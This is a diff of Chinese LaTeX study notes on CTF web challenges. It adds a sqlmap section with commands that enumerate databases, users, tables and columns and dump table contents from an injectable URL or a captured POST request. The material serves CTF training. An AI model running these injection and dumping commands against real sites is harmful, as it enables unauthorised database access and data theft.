@@ -7,7 +7,7 @@ web类题目是CTF比赛的主要题目，和二进制、逆向题目相比，�
 
 
 \subsection{敏感目录泄露}
-通过敏感目录泄露通常可以获取网站的源代码和敏感的URL地址。
+
 \subsubsection*{git泄露}
 
 \paragraph*{常规git泄露}
@@ -311,5 +311,23 @@ SELECT * FROM wp_news WHERE id='可控点1' AND title='可控点2'
     \item 数据库控制。
     \item SQL\ SERVER中系统命令执行。
 \end{itemize}
+
+\subsection{sqlmap}
+使用\href{https://github.com/sqlmapproject/sqlmap}{sqlmap}可以直接注入。若注入点在参数中，可以直接:
+\begin{lstlisting}
+python sqlmap.py http://target.com?id=1
+sql选项:
+./sqlmap.py -u "注入地址" --dbs // 列举数据库
+./sqlmap.py -u "注入地址" --current-db // 当前数据库
+./sqlmap.py -u "注入地址" --users // 列数据库用户
+./sqlmap.py -u "注入地址" --current-user // 当前用户
+./sqlmap.py -u "注入地址" --tables -D "数据库" // 列举数据库的表名
+./sqlmap.py -u "注入地址" --columns -T "表名" -D "数据库" // 获取表的列名
+./sqlmap.py -u "注入地址" --dump -C "字段,字段" -T "表名" -D "数据库" // 获取表中的数据，包含列，就是脱裤
+\end{lstlisting}
+若注入点在POST请求中，可以用burp抓包后把请求包保存下来，然后直接:
+\begin{lstlisting}
+python sqlmap.py -r "post.txt" -p [ArgName] --[option]
+\end{lstlisting}
 
 \section{任意文件读取}
